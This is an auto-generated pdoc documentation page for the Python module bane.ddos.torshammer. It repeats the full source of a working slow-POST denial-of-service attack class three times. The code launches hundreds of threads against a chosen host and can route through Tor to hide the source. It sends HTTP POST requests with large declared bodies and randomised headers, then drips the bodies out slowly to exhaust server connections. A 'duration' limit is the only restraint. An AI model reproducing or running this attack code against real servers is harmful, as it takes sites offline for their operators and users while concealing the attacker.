<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.ddos.torshammer</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.ddos.utils import *

class torshammer(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        threads_daemon=True,
        threads=500,
        timeout=5,
        tor=False,
        duration=60,
        logs=False,
        max_content=15000,
        min_content=10000,
    ):
        self.counter = 0
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.max_content = max_content
        self.min_content = min_content
        self.stop = False
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.tor = tor
        self.logs = logs
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                    if self.tor == False:
                        s.settimeout(self.timeout)
                    if self.tor == True:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True)
                    s.connect((self.target, self.port))
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                    self.counter += 1
                    if self.logs == True:
                        sys.stdout.write(
                            &#34;\rConnected to {}:{}...&#34;.format(self.target, self.port)
                        )
                        sys.stdout.flush()
                        # print(&#34;Connected to {}:{}...&#34;.format(self.target,self.port))
                    q = random.randint(self.min_content, self.max_content)
                    ck = &#34;&#34;
                    if self.cookie:
                        ck = &#34;Cookie: &#34; + self.cookie + &#34;\r\n&#34;
                    s.send(
                        reorder_headers_randomly(
                            &#34;POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n&#34;.format(
                                random.choice(paths),
                                ck,
                                random.choice(self.user_agents),
                                random.randint(300, 1000),
                                q,
                                (
                                    random.choice(referers)
                                    + random.choice(lis)
                                    + str(random.randint(0, 100000000))
                                    + random.choice(lis)
                                ),
                                self.target,
                            )
                        ).encode(&#34;utf-8&#34;)
                    )
                    for i in range(q):
                        if (
                            int(time.time() - self.start) &gt;= self.duration
                        ):  # this is a safety mechanism so the attack won&#39;t run forever
                            break
                        if self.stop == True:
                            break
                        h = random.choice(lis)
                        try:
                            s.send(h.encode(&#34;utf-8&#34;))
                            if self.logs == True:
                                sys.stdout.write(&#34;\rPosted: {}&#34;.format(h))
                                sys.stdout.flush()
                                # print(&#34;Posted: {}&#34;.format(h))
                            time.sleep(random.uniform(0.1, 3))
                        except:
                            break
                    s.close()
                except:
                    pass
                self.counter -= 1
                time.sleep(0.1)
                if self.stop == True:
                    break
            self.kill()
        except:
            pass</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.ddos.torshammer.torshammer"><code class="flex name class">
<span>class <span class="ident">torshammer</span></span>
<span>(</span><span>u, p=80, cookie=None, user_agents=None, threads_daemon=True, threads=500, timeout=5, tor=False, duration=60, logs=False, max_content=15000, min_content=10000)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class torshammer(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        threads_daemon=True,
        threads=500,
        timeout=5,
        tor=False,
        duration=60,
        logs=False,
        max_content=15000,
        min_content=10000,
    ):
        self.counter = 0
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.max_content = max_content
        self.min_content = min_content
        self.stop = False
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.tor = tor
        self.logs = logs
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                    if self.tor == False:
                        s.settimeout(self.timeout)
                    if self.tor == True:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True)
                    s.connect((self.target, self.port))
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                    self.counter += 1
                    if self.logs == True:
                        sys.stdout.write(
                            &#34;\rConnected to {}:{}...&#34;.format(self.target, self.port)
                        )
                        sys.stdout.flush()
                        # print(&#34;Connected to {}:{}...&#34;.format(self.target,self.port))
                    q = random.randint(self.min_content, self.max_content)
                    ck = &#34;&#34;
                    if self.cookie:
                        ck = &#34;Cookie: &#34; + self.cookie + &#34;\r\n&#34;
                    s.send(
                        reorder_headers_randomly(
                            &#34;POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n&#34;.format(
                                random.choice(paths),
                                ck,
                                random.choice(self.user_agents),
                                random.randint(300, 1000),
                                q,
                                (
                                    random.choice(referers)
                                    + random.choice(lis)
                                    + str(random.randint(0, 100000000))
                                    + random.choice(lis)
                                ),
                                self.target,
                            )
                        ).encode(&#34;utf-8&#34;)
                    )
                    for i in range(q):
                        if (
                            int(time.time() - self.start) &gt;= self.duration
                        ):  # this is a safety mechanism so the attack won&#39;t run forever
                            break
                        if self.stop == True:
                            break
                        h = random.choice(lis)
                        try:
                            s.send(h.encode(&#34;utf-8&#34;))
                            if self.logs == True:
                                sys.stdout.write(&#34;\rPosted: {}&#34;.format(h))
                                sys.stdout.flush()
                                # print(&#34;Posted: {}&#34;.format(h))
                            time.sleep(random.uniform(0.1, 3))
                        except:
                            break
                    s.close()
                except:
                    pass
                self.counter -= 1
                time.sleep(0.1)
                if self.stop == True:
                    break
            self.kill()
        except:
            pass</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="bane.ddos.utils.DDoS_Class" href="utils.html#bane.ddos.utils.DDoS_Class">DDoS_Class</a></li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="bane.ddos.torshammer.torshammer.attack"><code class="name flex">
<span>def <span class="ident">attack</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def attack(self):
    try:
        time.sleep(1)
        while True:
            if (
                int(time.time() - self.start) &gt;= self.duration
            ):  # this is a safety mechanism so the attack won&#39;t run forever
                break
            if self.stop == True:
                break
            try:
                s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                if self.tor == False:
                    s.settimeout(self.timeout)
                if self.tor == True:
                    s.setproxy(socks.PROXY_TYPE_SOCKS5, &#34;127.0.0.1&#34;, 9050, True)
                s.connect((self.target, self.port))
                if (self.port == 443) or (self.port == 8443):
                    s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                self.counter += 1
                if self.logs == True:
                    sys.stdout.write(
                        &#34;\rConnected to {}:{}...&#34;.format(self.target, self.port)
                    )
                    sys.stdout.flush()
                    # print(&#34;Connected to {}:{}...&#34;.format(self.target,self.port))
                q = random.randint(self.min_content, self.max_content)
                ck = &#34;&#34;
                if self.cookie:
                    ck = &#34;Cookie: &#34; + self.cookie + &#34;\r\n&#34;
                s.send(
                    reorder_headers_randomly(
                        &#34;POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n&#34;.format(
                            random.choice(paths),
                            ck,
                            random.choice(self.user_agents),
                            random.randint(300, 1000),
                            q,
                            (
                                random.choice(referers)
                                + random.choice(lis)
                                + str(random.randint(0, 100000000))
                                + random.choice(lis)
                            ),
                            self.target,
                        )
                    ).encode(&#34;utf-8&#34;)
                )
                for i in range(q):
                    if (
                        int(time.time() - self.start) &gt;= self.duration
                    ):  # this is a safety mechanism so the attack won&#39;t run forever
                        break
                    if self.stop == True:
                        break
                    h = random.choice(lis)
                    try:
                        s.send(h.encode(&#34;utf-8&#34;))
                        if self.logs == True:
                            sys.stdout.write(&#34;\rPosted: {}&#34;.format(h))
                            sys.stdout.flush()
                            # print(&#34;Posted: {}&#34;.format(h))
                        time.sleep(random.uniform(0.1, 3))
                    except:
                        break
                s.close()
            except:
                pass
            self.counter -= 1
            time.sleep(0.1)
            if self.stop == True:
                break
        self.kill()
    except:
        pass</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.ddos" href="index.md">bane.ddos</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.ddos.torshammer.torshammer" href="#bane.ddos.torshammer.torshammer">torshammer</a></code></h4>
<ul class="">
<li><code><a title="bane.ddos.torshammer.torshammer.attack" href="#bane.ddos.torshammer.torshammer.attack">attack</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>